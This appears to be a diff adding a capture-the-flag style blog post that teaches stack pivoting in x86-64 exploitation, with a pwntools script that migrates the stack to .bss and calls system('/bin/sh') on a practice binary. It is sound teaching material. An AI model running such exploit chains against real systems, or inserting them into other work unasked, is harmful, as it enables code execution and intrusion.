@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>stack pivoting — when the overflow is too small — algoatson.github.io</title>
+<meta name="description" content="You control the return address but only have room for two or three gadgets after it. Pivot the stack: point rsp at a buffer you fully control and run the real chain from there. leave;ret, pop rsp, xchg — the move that turns a cramped overflow into unlimited ROP.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/stack-pivoting/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stack pivoting — when the overflow is too small — algoatson.github.io">
+<meta property="og:description" content="You control the return address but only have room for two or three gadgets after it. Pivot the stack: point rsp at a buffer you fully control and run the real chain from there. leave;ret, pop rsp, xchg — the move that turns a cramped overflow into unlimited ROP.">
+<meta property="og:url" content="https://algoatson.github.io/p/stack-pivoting/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/stack-pivoting.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "stack pivoting — when the overflow is too small", "datePublished": "2026-05-30", "dateModified": "2026-05-30", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "You control the return address but only have room for two or three gadgets after it. Pivot the stack: point rsp at a buffer you fully control and run the real chain from there. leave;ret, pop rsp, xchg — the move that turns a cramped overflow into unlimited ROP.", "url": "https://algoatson.github.io/p/stack-pivoting/", "mainEntityOfPage": "https://algoatson.github.io/p/stack-pivoting/", "keywords": "pwn, rop"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>stack pivoting — when the overflow is too small</h1>
+  <div class="meta"><span>2026-05-30</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-pivot-gadgets">the pivot gadgets</a></li>
+<li><a href="#stack-migration-with-leaveret">stack migration with leave;ret</a></li>
+<li><a href="#the-gotchas-that-bite">the gotchas that bite</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>A frustrating shape of bug: you overflow into the saved return address, but the
+buffer ends a few bytes later — room for maybe two gadgets, nowhere near a full
+ROP chain. The fix is to stop running off this stack. <strong>Pivot</strong> <code class="highlight">rsp</code> to a region
+you <em>do</em> control completely — a big input buffer, the <code class="highlight">.bss</code> — and execute the
+real chain from there.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./cramped</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>overflow</dt><dd>reaches saved RIP + ~16 bytes — not enough for a real chain</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li></ul></div></figure>
+<h2 id="the-pivot-gadgets">the pivot gadgets<a class="headerlink" href="#the-pivot-gadgets" title="Permanent link">#</a></h2>
+<p>Pivoting means loading <code class="highlight">rsp</code> from something you control. The common gadgets, in
+rough order of how often they show up:</p>
+<ul>
+<li><strong><code class="highlight">leave; ret</code></strong> — <code class="highlight">leave</code> is <code class="highlight">mov rsp, rbp ; pop rbp</code>. If you control the saved
+  <code class="highlight">rbp</code>, this <em>is</em> a pivot: the epilogue sets <code class="highlight">rsp</code> to your value. The workhorse.</li>
+<li><strong><code class="highlight">pop rsp; ret</code></strong> — direct, rare, lovely when it exists.</li>
+<li><strong><code class="highlight">xchg rax, rsp; ret</code></strong> — pivot through <code class="highlight">rax</code> (pair with a gadget that loads
+  <code class="highlight">rax</code>).</li>
+<li><strong><code class="highlight">add rsp, 0xNN; ret</code></strong> — not a full pivot, but walks <code class="highlight">rsp</code> forward over junk
+  into a chain you placed just ahead.</li>
+</ul>
+<h2 id="stack-migration-with-leaveret">stack migration with leave;ret<a class="headerlink" href="#stack-migration-with-leaveret" title="Permanent link">#</a></h2>
+<p>The classic move uses <code class="highlight">leave; ret</code> <em>twice</em>. Read your full chain into a known
+location (here, <code class="highlight">.bss</code>), set the saved <code class="highlight">rbp</code> to <code class="highlight">fake_stack - 8</code>, and return into
+a <code class="highlight">leave; ret</code>. The function's own epilogue does the rest:</p>
+<figure class="codeblock"><figcaption><span class="fname">what the second leave;ret does</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#what-the-second-leaveret-does-1">1</a></span>
+<span class="normal"><a href="#what-the-second-leaveret-does-2">2</a></span>
+<span class="normal"><a href="#what-the-second-leaveret-does-3">3</a></span>
+<span class="normal"><a href="#what-the-second-leaveret-does-4">4</a></span>
+<span class="normal"><a href="#what-the-second-leaveret-does-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="what-the-second-leaveret-does-1">saved rbp  = fake_stack - 8           ; you wrote this in the overflow
+</span><span id="what-the-second-leaveret-does-2">ret -&gt; leave; ret
+</span><span id="what-the-second-leaveret-does-3">        mov rsp, rbp                   ; rsp = fake_stack - 8
+</span><span id="what-the-second-leaveret-does-4">        pop rbp                        ; rsp = fake_stack
+</span><span id="what-the-second-leaveret-does-5">        ret                            ; now executing YOUR chain at fake_stack
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>pwntools wraps the whole pattern — stage the long chain somewhere writable, then
+migrate:</p>
+<figure class="codeblock"><figcaption><span class="fname">pivot.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#pivotpy-1"> 1</a></span>
+<span class="normal"><a href="#pivotpy-2"> 2</a></span>
+<span class="normal"><a href="#pivotpy-3"> 3</a></span>
+<span class="normal"><a href="#pivotpy-4"> 4</a></span>
+<span class="normal"><a href="#pivotpy-5"> 5</a></span>
+<span class="normal"><a href="#pivotpy-6"> 6</a></span>
+<span class="normal"><a href="#pivotpy-7"> 7</a></span>
+<span class="normal"><a href="#pivotpy-8"> 8</a></span>
+<span class="normal"><a href="#pivotpy-9"> 9</a></span>
+<span class="normal"><a href="#pivotpy-10">10</a></span>
+<span class="normal"><a href="#pivotpy-11">11</a></span>
+<span class="normal"><a href="#pivotpy-12">12</a></span>
+<span class="normal"><a href="#pivotpy-13">13</a></span>
+<span class="normal"><a href="#pivotpy-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="pivotpy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="pivotpy-2"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./cramped&quot;</span><span class="p">)</span>
+</span><span id="pivotpy-3"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+</span><span id="pivotpy-4">
+</span><span id="pivotpy-5"><span class="n">bss</span>   <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>
+</span><span id="pivotpy-6"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">bss</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>        <span class="c1"># 1) read the real chain into .bss</span>
+</span></span><span id="pivotpy-7"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>               <span class="c1"># 2) leave;ret pivot: rsp -&gt; bss</span>
+</span></span><span id="pivotpy-8"><span class="hll"><span class="c1"># the big chain that lives at bss: dup, dlresolve, system, whatever you need</span>
+</span></span><span id="pivotpy-9"><span class="hll"><span class="n">chain</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">);</span> <span class="n">chain</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">],</span> <span class="p">[</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))])</span>
+</span></span><span id="pivotpy-10">
+</span><span id="pivotpy-11"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span><span id="pivotpy-12"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">({</span><span class="n">off_to_rbp</span><span class="p">:</span> <span class="n">bss</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">off_to_rip</span><span class="p">:</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()}))</span>
+</span><span id="pivotpy-13"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">chain</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>         <span class="c1"># delivered into .bss by the read() above</span>
+</span><span id="pivotpy-14"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>from 16 bytes of room to a full chain</summary>
+<p>The cramped overflow only had to fit <code class="highlight">read</code> + <code class="highlight">migrate</code>; the real work runs
+off <code class="highlight">.bss</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{rsp_goes_where_i_say}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="the-gotchas-that-bite">the gotchas that bite<a class="headerlink" href="#the-gotchas-that-bite" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>You need a writable address for the fake stack.</strong> No-PIE gives you <code class="highlight">.bss</code>
+  free; with PIE, leak first. A <em>leaked</em> stack address works too — pivot onto your
+  own input.</li>
+<li><strong><code class="highlight">leave; ret</code> clobbers <code class="highlight">rbp</code>.</strong> After the pivot <code class="highlight">rbp</code> is whatever you popped; if
+  later gadgets need a sane frame, set it deliberately.</li>
+<li><strong>16-byte alignment.</strong> <code class="highlight">system</code>/<code class="highlight">movaps</code> will fault on a misaligned <code class="highlight">rsp</code>; drop a
+  bare <code class="highlight">ret</code> into the chain to realign, exactly as you would in any libc call.</li>
+<li><strong>Don't overlap.</strong> If your fake stack sits where the <em>current</em> chain is still
+  executing, the <code class="highlight">read</code> can stomp the gadget you're about to return into. Keep the
+  staging buffer clear of the live chain.</li>
+</ul>
+<p>Stack pivoting is the move that decouples "where the bug writes" from "where the
+chain runs." Once <code class="highlight">rsp</code> points at memory you own, the size of the original
+overflow stops mattering — you have as much ROP as you can write.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-22</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/srop-one-syscall-every-register/">SROP — one syscall, every register</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-05-12</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/finding-gadgets/">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a><span class="row__min">5 min</span></div><div class="row"><span class="row__date">2026-05-10</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/ret2dlresolve-no-leak/">ret2dlresolve — a shell with no libc leak</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/rizin-radare2-in-anger/"><span class="lbl">&#8249; newer</span>rizin and radare2 in anger</a><a class="next" href="/p/pwntools-cookbook/"><span class="lbl">older &#8250;</span>a pwntools cookbook</a></nav></main>
+
+    <footer class="status">
+      <span>40 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
